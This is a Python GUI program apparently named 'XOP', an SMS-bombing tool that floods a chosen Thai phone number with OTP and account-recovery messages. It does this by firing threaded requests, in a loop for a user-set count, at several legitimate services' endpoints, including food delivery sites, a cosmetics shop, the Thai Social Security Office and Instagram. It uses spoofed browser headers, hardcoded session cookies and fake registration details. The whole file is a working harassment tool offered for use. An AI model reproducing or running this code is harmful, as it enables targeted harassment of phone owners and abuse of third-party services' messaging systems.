import bs4; from tkinter import *; from PIL import ImageTk, Image; from io import BytesIO
import requests, os, threading, gratient, subprocess, ctypes, datetime, pytz, json, time,random, sys; from colorama import Fore
from tkinter import messagebox; from tkinter.filedialog import askopenfilename



smsui = Tk()
smsui.geometry('700x360')
smsui.maxsize(700, 360)
smsui.minsize(700, 360)
# smsui.wm_attributes("-transparentcolor", "grey")
# smsui.overrideredirect(True)
#photo side bar
img_bg = ImageTk.PhotoImage(Image.open(BytesIO(requests.Session().get("https://cdn.discordapp.com/attachments/963384781909917716/1032270825237258322/Frame_18_2.png").content)))
img_exit = ImageTk.PhotoImage(Image.open(BytesIO(requests.Session().get("https://cdn.discordapp.com/attachments/963384781909917716/1031924715171893270/error-10379_1_1_1.png").content)))
img_false = ImageTk.PhotoImage(Image.open(BytesIO(requests.Session().get("https://cdn.discordapp.com/attachments/963384781909917716/1031932098614931476/Frame_16.png").content)))
img_true = ImageTk.PhotoImage(Image.open(BytesIO(requests.Session().get("https://cdn.discordapp.com/attachments/963384781909917716/1031932776750006362/Frame_13_2.png").content)))
img_attack = ImageTk.PhotoImage(Image.open(BytesIO(requests.Session().get("https://cdn.discordapp.com/attachments/963384781909917716/1033746821723459654/Frame_18_3.png").content)))

class UI:
    def __init__(self):
        self.Proxy_TorF = False
        self.Header_TorF = False
        self.main()
    # def get_pos(self, event):
    #     global xwin
    #     global ywin
    #     self.xwin = event.x
    #     self.ywin = event.y

    # def move_window(self, event):
    #     smsui.geometry(f'+{event.x_root - self.xwin}+{event.y_root - self.ywin}')

    # def exit_click(self):
    #     smsui.quit()

    def random_proxy_fuction(self):
        if self.Proxy_TorF == False:
            self.Proxy_TorF = True
            self.random_proxy.config(image=img_true)
            print("Random_Proxy : True")
        else:
            self.Proxy_TorF = False
            self.random_proxy.config(image=img_false)
            print("Random_Proxy : False")

    def random_header_fuction(self):
        if self.Header_TorF == False:
            self.Header_TorF = True
            self.random_header.config(image=img_true)
            print("Random_Header : True")
        else:
            self.Header_TorF = False
            self.random_header.config(image=img_false)
            print("Random_Header : False")

    def main(self):
        Background = Label(smsui, border=0, bg="grey", image=img_bg).place(x=0, y=0)
        # f_ph_label.pack(fill=BOTH, expand=True)
        # f_ph_label.bind("<B1-Motion>", self.move_window)
        # f_ph_label.bind("<Button-1>", self.get_pos)
        # close = Label(smsui, image=img_exit, border=0, bg="#000000")
        # close.place(x=660, y=12)
        # close.bind("<Button>", lambda e:self.exit_click())
        self.Get_Phone = StringVar()
        self.phone_get = Entry(smsui, textvariable=self.Get_Phone, font = ("Comic Sans MS", 14, "bold"),fg="black",bg="#343131", bd=0, highlightthickness=0)
        self.phone_get.place(x=58, y=133, height=24, width=340)
        self.Get_Amount = StringVar()
        self.amount_get = Entry(smsui, textvariable=self.Get_Amount, font = ("Comic Sans MS", 14, "bold"),fg="black",bg="#343131", bd=0, highlightthickness=0)
        self.amount_get.place(x=58, y=209, height=24, width=340)
        self.Get_Number_Api = StringVar()
        self.numberapi = Entry(smsui, textvariable=self.Get_Number_Api, font = ("Comic Sans MS", 14, "bold"),fg="black",bg="#3E3D3D", bd=0, highlightthickness=0)
        self.numberapi.place(x=500, y=203, height=24, width=130)
        self.random_proxy = Button(smsui, cursor='heart', bd=0, highlightbackground="black", image=img_false, highlightthickness=0, bg='#272626',borderwidth=0, activebackground="#282828",command=lambda:self.random_proxy_fuction())
        self.random_proxy.place(x=597,y=57)
        self.random_header = Button(smsui, cursor='heart', bd=0, highlightbackground="black", image=img_false, highlightthickness=0, bg='#272626',borderwidth=0, activebackground="#282828",command=lambda:self.random_header_fuction())
        self.random_header.place(x=597,y=103)
        self.attack = Button(smsui, cursor='heart', bd=0, highlightbackground="black", image=img_attack, highlightthickness=0, bg='#272626',borderwidth=0, activebackground="#282828",command=lambda:self.Attack_fuction())
        self.attack.place(x=20,y=300)
    
    def Attack_fuction(self):
        if self.Get_Phone.get() == "":
            messagebox.showerror("XOP", 'กรุณาใส่หมายเลขโทรศัพท์ที่จะสแปม!')
        elif self.Get_Phone.get() == "0":
            messagebox.showerror("XOP", 'กรุณาใส่หมายเลขโทรศัพท์ที่จะสแปมให้ถูกต้อง!')
        elif len(self.Get_Phone.get()) < 9 or len(self.Get_Phone.get()) > 10:
            messagebox.showerror("XOP", 'กรุณาใส่หมายเลขโทรศัพท์ที่จะสแปมให้ถูกต้อง!')
        else:
            try:
                phone=self.Get_Phone.get()
                num=int(self.Get_Amount.get())
            except ValueError:
                if self.Get_Amount.get() == "":
                    messagebox.showerror("XOP", 'กรุณาใส่จำนวนที่จะสแปม!')
                elif self.Get_Amount.get() == "0":
                    messagebox.showerror("XOP", 'กรุณาใส่จำนวนที่จะสแปมให้ถูกต้อง!')
                else:
                    messagebox.showerror("XOP", '...')
            blacklist = [
                "0638618523"
            ]
            if (phone not in blacklist):
                def _Pizza1112():
                    headerpiz = {"user-agent": "Mozilla/5.0 (Linux; U; Android 9; th-th; CPH2015 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/25.8.3.1"}
                    requests.Session().post("https://api2.1112.com/api/v1/otp/create", headers=headerpiz, data={'phonenumber': phone,'language': "th"})
                def _1112DELIVER():
                    header = {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"}
                    requests.Session().post("https://api.1112delivery.com/api/v1/otp/create", headers=header, data={'phonenumber': phone,'language': "th"})
                def _Konvy():
                    header = {'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25'}
                    requests.Session().post(f"https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}", headers=header)
                def _SSO():
                    requests.Session().post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp', headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
                def _FACEBOOK():
                    requests.Session().post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=", headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"})
                for i in range(num):
                    threading.Thread(target=_Pizza1112).start()
                    threading.Thread(target=_1112DELIVER).start()
                    threading.Thread(target=_Konvy).start()
                    threading.Thread(target=_SSO).start()
                    threading.Thread(target=_FACEBOOK).start()
            else:
                messagebox.showerror("XOP", 'ดอออ ไอ่วัว')


UI()
smsui.mainloop()
